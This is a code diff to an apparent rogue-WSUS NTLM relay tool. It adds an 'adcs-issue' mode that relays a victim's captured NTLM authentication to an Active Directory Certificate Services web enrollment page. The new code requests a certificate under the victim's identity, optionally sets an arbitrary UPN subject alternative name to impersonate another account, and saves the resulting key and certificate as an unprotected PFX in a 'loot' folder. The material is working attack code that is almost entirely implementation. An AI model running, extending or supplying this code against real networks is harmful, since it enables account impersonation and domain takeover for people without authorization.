@@ -2,7 +2,7 @@
 
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from random import randint
-from urllib.parse import urlparse
+from urllib.parse import quote, urlparse
 import http.client
 import xml.etree.ElementTree as ET
 import uuid
@@ -47,6 +47,23 @@ NTLM_TYPE2_FLAGS = (
 )
 
 NTLM_SESSION_TTL = 120
+
+ADCS_TEMPLATE_FIELDS = (
+    "OFFLINE",
+    "REALNAME",
+    "KEYSPEC",
+    "KEYFLAG",
+    "ENROLLFLAG",
+    "PRIVATEKEYFLAG",
+    "SUBJECTFLAG",
+    "RASIGNATURE",
+    "CSPLIST",
+    "EXTOID",
+    "EXTMAJ",
+    "EXTFMIN",
+    "EXTMIN",
+    "FRIENDLYNAME",
+)
 
 
 def _secbuf(length, offset):
@@ -239,15 +256,22 @@ class HTTPNTLMRelayBackend:
         timeout=10,
         action="auth-only",
         adcs_markers=None,
+        adcs_template=None,
+        adcs_alt_name=None,
+        adcs_loot_dir="loot",
     ):
         self.target_url = target_url
         self.timeout = timeout
         self.action = action
+        self.adcs_template = adcs_template
+        self.adcs_alt_name = adcs_alt_name
+        self.adcs_loot_dir = adcs_loot_dir
         self.adcs_markers = [
             marker.strip()
             for marker in (adcs_markers or [])
             if marker and marker.strip()
         ]
+        self.adcs_issued = set()
         self.sessions = {}
         self.lock = threading.RLock()
 
@@ -298,6 +322,342 @@ class HTTPNTLMRelayBackend:
                     return part.split(" ", 1)[1]
 
         return None
+
+    def _headers_dict(self, response):
+        headers = {}
+        for name, value in response.getheaders():
+            key = name.lower()
+            if key in headers:
+                headers[key] = f"{headers[key]}, {value}"
+            else:
+                headers[key] = value
+        return headers
+
+    def _read_response_body(self, response, max_hint=4096):
+        content_length = response.getheader("Content-Length")
+        transfer_encoding = response.getheader("Transfer-Encoding", "")
+
+        if content_length is not None or "chunked" in transfer_encoding.lower():
+            body = response.read()
+            return body[:max_hint], len(body), True
+
+        body = response.read(max_hint)
+        return body, len(body), False
+
+    def _result_from_response(self, response, body, body_len, prefix=""):
+        headers = self._headers_dict(response)
+        key = f"{prefix}_" if prefix else ""
+
+        return {
+            f"{key}status": response.status,
+            f"{key}reason": response.reason,
+            f"{key}body_len": body_len,
+            f"{key}server": headers.get("server", ""),
+            f"{key}content_type": headers.get("content-type", ""),
+            f"{key}location": headers.get("location", ""),
+            f"{key}www_authenticate": headers.get("www-authenticate", ""),
+            f"{key}body_hint": body[:200].decode("latin-1", errors="replace"),
+        }
+
+    def _adcs_base_path(self):
+        path = self.path.split("?", 1)[0]
+        certsrv_index = path.lower().find("/certsrv")
+        if certsrv_index == -1:
+            return ""
+
+        return path[: certsrv_index + len("/certsrv")].rstrip("/")
+
+    def _adcs_path(self, leaf):
+        base = self._adcs_base_path()
+        if not base:
+            return self.path
+        return f"{base}/{leaf.lstrip('/')}"
+
+    def _adcs_probe_path(self):
+        return self._adcs_path("certrqxt.asp")
+
+    def _parse_adcs_template_options(self, body_text):
+        templates = []
+        option_values = re.findall(
+            r"<option\s+value=\"(.*?)\"",
+            body_text,
+            flags=re.IGNORECASE,
+        )
+
+        for raw_value in option_values:
+            parts = html.unescape(raw_value).split(";")
+            template = {}
+            for index, value in enumerate(parts):
+                key = (
+                    ADCS_TEMPLATE_FIELDS[index]
+                    if index < len(ADCS_TEMPLATE_FIELDS)
+                    else f"UNKNOWN_{index}"
+                )
+                template[key] = value
+            templates.append(template)
+
+        return templates
+
+    def _authenticated_followup(self, conn, path=None, connection="close"):
+        followup_path = path or self.path
+        conn.request(
+            "GET",
+            followup_path,
+            headers={
+                "Host": self.host_header,
+                "Connection": connection,
+                "User-Agent": "pywsus-ntlm-relay",
+            },
+        )
+        res = conn.getresponse()
+        body, body_len, body_drained = self._read_response_body(res)
+        result = self._result_from_response(res, body, body_len, "followup")
+        result["followup_path"] = followup_path
+        result["followup_body_drained"] = body_drained
+        result["followup_will_close"] = getattr(res, "will_close", False)
+        result["followup_authenticated"] = self._looks_authenticated(
+            {
+                "status": result["followup_status"],
+                "www_authenticate": result["followup_www_authenticate"],
+            }
+        )
+        return result, body
+
+    def _load_adcs_crypto(self):
+        try:
+            from OpenSSL import crypto  # type: ignore
+            from cryptography import x509  # type: ignore
+            from cryptography.hazmat.backends import default_backend  # type: ignore
+            from cryptography.hazmat.primitives.serialization import (  # type: ignore
+                NoEncryption,
+                pkcs12,
+            )
+            from cryptography.x509 import load_pem_x509_certificate  # type: ignore
+        except ImportError as err:
+            raise RuntimeError(
+                "AD CS issuance requires pyOpenSSL and cryptography"
+            ) from err
+
+        return crypto, x509, default_backend, NoEncryption, pkcs12, load_pem_x509_certificate
+
+    @staticmethod
+    def _adcs_generate_csr(crypto, key, common_name, alt_name):
+        req = crypto.X509Req()
+
+        if common_name:
+            req.get_subject().CN = common_name
+
+        if alt_name:
+            req.add_extensions([
+                crypto.X509Extension(
+                    b"subjectAltName",
+                    False,
+                    b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b"
+                    % alt_name.encode(),
+                )
+            ])
+
+        req.set_pubkey(key)
+        req.sign(key, "sha256")
+        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)
+
+    @staticmethod
+    def _adcs_generate_pfx(pkcs12, NoEncryption, key, certificate):
+        return pkcs12.serialize_key_and_certificates(
+            name=b"",
+            key=key,
+            cert=certificate,
+            cas=None,
+            encryption_algorithm=NoEncryption(),
+        )
+
+    @staticmethod
+    def _adcs_cert_attributes(template, alt_name):
+        if alt_name:
+            return f"CertificateTemplate:{template}%0d%0aSAN:upn={alt_name}"
+        return f"CertificateTemplate:{template}"
+
+    @staticmethod
+    def _sanitize_filename(name):
+        sanitized = re.sub(r"[^A-Za-z0-9._-]", "_", name or "")
+        sanitized = sanitized.strip("._")
+        return sanitized or "certificate"
+
+    def _adcs_identity_key(self, identity, username):
+        return (identity or username or "").lower()
+
+    def _adcs_template_for(self, username):
+        if self.adcs_template:
+            return self.adcs_template
+        return "Machine" if (username or "").endswith("$") else "User"
+
+    def _extract_adcs_request_id(self, body):
+        body_text = body.decode("latin-1", errors="replace")
+        found = re.findall(r'location="certnew\.cer\?ReqID=(.*?)&', body_text)
+        if found:
+            return html.unescape(found[0])
+
+        found = re.findall(r"certnew\.cer\?ReqID=([^&\"'>\s]+)", body_text)
+        if found:
+            return html.unescape(found[0])
+
+        return ""
+
+    def _issue_adcs_certificate(self, conn, identity, username):
+        issue_key = self._adcs_identity_key(identity, username)
+        with self.lock:
+            if issue_key and issue_key in self.adcs_issued:
+                return {
+                    "adcs_issue_attempted": False,
+                    "adcs_issued": False,
+                    "adcs_issue_state": "skipped-duplicate",
+                }
+
+        template = self._adcs_template_for(username)
+        quoted_template = quote(template)
+        result = {
+            "adcs_issue_attempted": True,
+            "adcs_issued": False,
+            "adcs_issue_state": "started",
+            "adcs_template": template,
+            "adcs_alt_name": self.adcs_alt_name or "",
+            "adcs_loot_dir": self.adcs_loot_dir,
+        }
+
+        crypto, x509, default_backend, NoEncryption, pkcs12, load_pem = (
+            self._load_adcs_crypto()
+        )
+
+        key = crypto.PKey()
+        key.generate_key(crypto.TYPE_RSA, 4096)
+        common_name = username or identity
+        csr = self._adcs_generate_csr(
+            crypto,
+            key,
+            common_name,
+            self.adcs_alt_name,
+        )
+        encoded_csr = (
+            csr.decode()
+            .replace("\n", "")
+            .replace("+", "%2b")
+            .replace(" ", "+")
+        )
+        cert_attrib = self._adcs_cert_attributes(
+            quoted_template,
+            self.adcs_alt_name,
+        )
+        data = (
+            "Mode=newreq&CertRequest=%s&CertAttrib=%s&"
+            "TargetStoreFlags=0&SaveCert=yes&ThumbPrint="
+        ) % (encoded_csr, cert_attrib)
+        data_bytes = data.encode("utf-8")
+
+        submit_path = self._adcs_path("certfnsh.asp")
+        conn.request(
+            "POST",
+            submit_path,
+            body=data_bytes,
+            headers={
+                "Host": self.host_header,
+                "Connection": "keep-alive",
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Content-Length": str(len(data_bytes)),
+            },
+        )
+        submit_res = conn.getresponse()
+        submit_body, submit_body_len, submit_drained = self._read_response_body(
+            submit_res,
+            max_hint=65536,
+        )
+        result.update(
+            self._result_from_response(
+                submit_res,
+                submit_body,
+                submit_body_len,
+                "adcs_submit",
+            )
+        )
+
+        if submit_res.status != 200:
+            result["adcs_issue_state"] = "submit-failed"
+            result["adcs_issue_error"] = f"submit HTTP {submit_res.status}"
+            return result
+
+        request_id = self._extract_adcs_request_id(submit_body)
+        if not request_id:
+            result["adcs_issue_state"] = "request-id-missing"
+            result["adcs_issue_error"] = "certificate request ID not found"
+            return result
+
+        result["adcs_certificate_id"] = request_id
+
+        if not submit_drained or getattr(submit_res, "will_close", False):
+            result["adcs_issue_state"] = "certificate-fetch-skipped"
+            result["adcs_issue_error"] = "target closed before certificate fetch"
+            return result
+
+        cert_path = self._adcs_path(f"certnew.cer?ReqID={request_id}")
+        conn.request(
+            "GET",
+            cert_path,
+            headers={
+                "Host": self.host_header,
+                "Connection": "close",
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+            },
+        )
+        cert_res = conn.getresponse()
+        cert_body, cert_body_len, _ = self._read_response_body(
+            cert_res,
+            max_hint=262144,
+        )
+        result.update(
+            self._result_from_response(
+                cert_res,
+                cert_body,
+                cert_body_len,
+                "adcs_cert",
+            )
+        )
+
+        if cert_res.status != 200:
+            result["adcs_issue_state"] = "certificate-fetch-failed"
+            result["adcs_issue_error"] = f"certificate HTTP {cert_res.status}"
+            return result
+
+        try:
+            cert_obj = load_pem(cert_body, backend=default_backend())
+        except Exception:
+            cert_obj = x509.load_der_x509_certificate(
+                cert_body,
+                backend=default_backend(),
+            )
+
+        pfx_data = self._adcs_generate_pfx(
+            pkcs12,
+            NoEncryption,
+            key.to_cryptography_key(),
+            cert_obj,
+        )
+        os.makedirs(self.adcs_loot_dir, exist_ok=True)
+        pfx_name = self._sanitize_filename(identity or username)
+        pfx_path = os.path.join(self.adcs_loot_dir, f"{pfx_name}.pfx")
+        with open(pfx_path, "wb") as fh:
+            fh.write(pfx_data)
+
+        with self.lock:
+            if issue_key:
+                self.adcs_issued.add(issue_key)
+
+        result.update({
+            "adcs_issued": True,
+            "adcs_issue_state": "issued",
+            "adcs_pfx_path": pfx_path,
+            "adcs_pfx_size": len(pfx_data),
+        })
+        return result
 
     def start_type1(self, session_key, type1_token):
         conn = self._new_connection()
@@ -358,7 +718,7 @@ class HTTPNTLMRelayBackend:
             conn.close()
             raise
 
-    def finish_type3(self, session_key, type3_token):
+    def finish_type3(self, session_key, type3_token, identity="", username=""):
         with self.lock:
             session = self.sessions.pop(session_key, None)
         if not session:
@@ -372,30 +732,97 @@ class HTTPNTLMRelayBackend:
                 self.path,
                 headers={
                     "Host": self.host_header,
-                    "Connection": "close",
+                    "Connection": "keep-alive",
                     "User-Agent": "pywsus-ntlm-relay",
                     "Authorization": f"NTLM {type3_token}",
                 },
             )
             res = conn.getresponse()
-            body = res.read(4096)
-            headers = dict((k.lower(), v) for k, v in res.getheaders())
-            result = {
-                "status": res.status,
-                "reason": res.reason,
-                "body_len": len(body),
+            body, body_len, body_drained = self._read_response_body(res)
+            result = self._result_from_response(res, body, body_len)
+            result.update({
                 "authenticated": False,
+                "type3_accepted": False,
+                "followup_attempted": False,
+                "followup_authenticated": None,
+                "followup_state": "not-run",
+                "auth_validation": "rejected",
                 "action": self.action,
-                "server": headers.get("server", ""),
-                "content_type": headers.get("content-type", ""),
-                "location": headers.get("location", ""),
-                "www_authenticate": headers.get("www-authenticate", ""),
-                "body_hint": body[:200].decode("latin-1", errors="replace"),
-            }
-            result["authenticated"] = self._looks_authenticated(result)
+                "target_status_type2": session.get("target_status_type2"),
+            })
+            service_body = body
 
-            if self.action == "adcs-certsrv":
-                result.update(self._evaluate_adcs_certsrv(body, result))
+            result["type3_accepted"] = self._looks_authenticated(result)
+
+            if result["type3_accepted"]:
+                if body_drained and not getattr(res, "will_close", False):
+                    result["followup_attempted"] = True
+                    followup_path = (
+                        self._adcs_probe_path()
+                        if self.action in ("adcs-certsrv", "adcs-issue")
+                        else self.path
+                    )
+                    followup_connection = (
+                        "keep-alive" if self.action == "adcs-issue" else "close"
+                    )
+                    try:
+                        followup, followup_body = self._authenticated_followup(
+                            conn,
+                            followup_path,
+                            connection=followup_connection,
+                        )
+                        result.update(followup)
+                        if result.get("followup_authenticated") is True:
+                            service_body = followup_body
+                    except Exception as err:
+                        result["followup_error"] = str(err)
+                        result["followup_state"] = "error"
+
+                if result.get("followup_authenticated") is True:
+                    result["authenticated"] = True
+                    result["followup_state"] = "accepted"
+                    result["auth_validation"] = "type3-and-followup"
+                elif result.get("followup_authenticated") is False:
+                    result["authenticated"] = False
+                    result["followup_state"] = "rejected"
+                    result["auth_validation"] = "followup-rejected"
+                else:
+                    result["authenticated"] = True
+                    result["auth_validation"] = "type3-only"
+
+            if self.action in ("adcs-certsrv", "adcs-issue"):
+                result.update(self._evaluate_adcs_certsrv(service_body, result))
+                if self.action == "adcs-issue":
+                    can_issue = (
+                        result["authenticated"]
+                        and result["service_validated"]
+                        and result.get("followup_body_drained") is True
+                        and not result.get("followup_will_close", True)
+                    )
+                    if can_issue:
+                        try:
+                            issue_result = self._issue_adcs_certificate(
+                                conn,
+                                identity,
+                                username,
+                            )
+                            result.update(issue_result)
+                        except Exception as err:
+                            result.update({
+                                "adcs_issue_attempted": True,
+                                "adcs_issued": False,
+                                "adcs_issue_state": "error",
+                                "adcs_issue_error": str(err),
+                            })
+                    else:
+                        issue_state = "skipped-validation-failed"
+                        if result["authenticated"] and result["service_validated"]:
+                            issue_state = "skipped-connection-not-reusable"
+                        result.update({
+                            "adcs_issue_attempted": False,
+                            "adcs_issued": False,
+                            "adcs_issue_state": issue_state,
+                        })
             else:
                 result.update({
                     "service": "generic-http",
@@ -424,6 +851,19 @@ class HTTPNTLMRelayBackend:
         if self.path.rstrip("/").lower().endswith("/certsrv"):
             evidence.append("target_path=/certsrv/")
             score += 1
+
+        followup_path = result.get("followup_path", "")
+        if followup_path.split("?", 1)[0].rstrip("/").lower().endswith(
+            "/certsrv/certrqxt.asp"
+        ):
+            evidence.append("probe_path=/certsrv/certrqxt.asp")
+            score += 2
+
+        templates = self._parse_adcs_template_options(body_text)
+        if templates:
+            evidence.append(f"body:template_options={len(templates)}")
+            score += 4
+            marker_found = True
 
         strong_markers = {
             "microsoft active directory certificate services": (
@@ -469,14 +909,24 @@ class HTTPNTLMRelayBackend:
                 evidence.append(label)
                 score += weight
 
-        content_type = result.get("content_type", "").lower()
+        content_type_key = (
+            "followup_content_type"
+            if result.get("followup_authenticated") is True
+            else "content_type"
+        )
+        content_type = result.get(content_type_key, "").lower()
         if "html" in content_type:
-            evidence.append(f"content_type={result['content_type']}")
+            evidence.append(f"{content_type_key}={result[content_type_key]}")
             score += 1
 
-        server = result.get("server", "").lower()
+        server_key = (
+            "followup_server"
+            if result.get("followup_authenticated") is True
+            else "server"
+        )
+        server = result.get(server_key, "").lower()
         if "iis" in server or "microsoft" in server:
-            evidence.append(f"server={result['server']}")
+            evidence.append(f"{server_key}={result[server_key]}")
             score += 1
 
         return {
@@ -485,6 +935,8 @@ class HTTPNTLMRelayBackend:
             "adcs_score": score,
             "adcs_marker_found": marker_found,
             "adcs_custom_marker_found": custom_marker_found,
+            "adcs_template_count": len(templates),
+            "adcs_templates": templates,
             "evidence": evidence,
         }
 
@@ -1272,15 +1724,25 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
             if mode == "relay-http":
                 try:
-                    result = self.server.ntlm_relay_backend.finish_type3(session_key, token)
+                    result = self.server.ntlm_relay_backend.finish_type3(
+                        session_key,
+                        token,
+                        identity=identity,
+                        username=parsed["username"],
+                    )
                     relay_detail = (
                         f"identity={identity} "
                         f"target_status={result['status']} "
                         f"reason={result['reason']} "
                         f"authenticated={result['authenticated']} "
+                        f"validation={result.get('auth_validation', '')} "
+                        f"followup={result.get('followup_state', '')} "
                         f"service={result.get('service', '')} "
                         f"service_validated={result.get('service_validated', False)} "
                         f"adcs_score={result.get('adcs_score', '')} "
+                        f"adcs_issued={result.get('adcs_issued', '')} "
+                        f"cert_id={result.get('adcs_certificate_id', '')} "
+                        f"pfx={result.get('adcs_pfx_path', '')} "
                         f"content_type={result.get('content_type', '')}"
                     )
                     _log(0, ip, "WARN", f"HTTP relay result  {relay_detail}")
@@ -1505,6 +1967,9 @@ def run(
     relay_target=None,
     relay_action="auth-only",
     relay_adcs_markers=None,
+    adcs_template=None,
+    adcs_alt_name=None,
+    adcs_loot_dir="loot",
     ntlm_session_key="ip",
     ntlm_protect_downloads=False,
 ):
@@ -1520,6 +1985,9 @@ def run(
             relay_target,
             action=relay_action,
             adcs_markers=relay_adcs_markers,
+            adcs_template=adcs_template,
+            adcs_alt_name=adcs_alt_name,
+            adcs_loot_dir=adcs_loot_dir,
         )
     else:
         httpd.ntlm_relay_backend = None
@@ -1615,9 +2083,9 @@ def parse_args():
     )
     ntlm.add_argument(
         "--relay-action",
-        choices=["auth-only", "adcs-certsrv"],
+        choices=["auth-only", "adcs-certsrv", "adcs-issue"],
         default="auth-only",
-        help="Post-auth HTTP relay validation action. auth-only = generic proof. adcs-certsrv = validate AD CS Web Enrollment HTML context.",
+        help="Post-auth HTTP relay action. auth-only = generic proof. adcs-certsrv = validate AD CS Web Enrollment. adcs-issue = request and save a certificate.",
     )
     ntlm.add_argument(
         "--relay-adcs-marker",
@@ -1625,6 +2093,21 @@ def parse_args():
         default=[],
         metavar="TEXT",
         help="Additional body marker that validates --relay-action adcs-certsrv. Can be repeated for lab AD CS pages.",
+    )
+    ntlm.add_argument(
+        "--adcs-template",
+        default=None,
+        help="Certificate template for --relay-action adcs-issue (default: Machine for machine accounts, User otherwise).",
+    )
+    ntlm.add_argument(
+        "--adcs-alt-name",
+        default=None,
+        help="Optional UPN SAN value for --relay-action adcs-issue.",
+    )
+    ntlm.add_argument(
+        "--adcs-loot-dir",
+        default="loot",
+        help="Directory for issued AD CS PFX files (default: loot).",
     )
     ntlm.add_argument(
         "--ntlm-session-key",
@@ -1679,10 +2162,10 @@ if __name__ == '__main__':
             _console.print("[bold red][ERROR][/] --relay-target must be http:// or https://")
             sys.exit(1)
         if (
-            args.relay_action == "adcs-certsrv"
+            args.relay_action in ("adcs-certsrv", "adcs-issue")
             and not parsed_relay_target.path.rstrip("/").lower().endswith("/certsrv")
         ):
-            _console.print("[bold yellow][WARN][/] --relay-action adcs-certsrv usually expects --relay-target ending in /certsrv/")
+            _console.print("[bold yellow][WARN][/] AD CS relay actions usually expect --relay-target ending in /certsrv/")
 
     _log_level = min(args.verbose, 2)
     _log_file  = args.log_file
@@ -1755,6 +2238,9 @@ if __name__ == '__main__':
             args.relay_target,
             args.relay_action,
             args.relay_adcs_marker,
+            args.adcs_template,
+            args.adcs_alt_name,
+            args.adcs_loot_dir,
             args.ntlm_session_key,
             args.ntlm_protect_downloads,
         ),
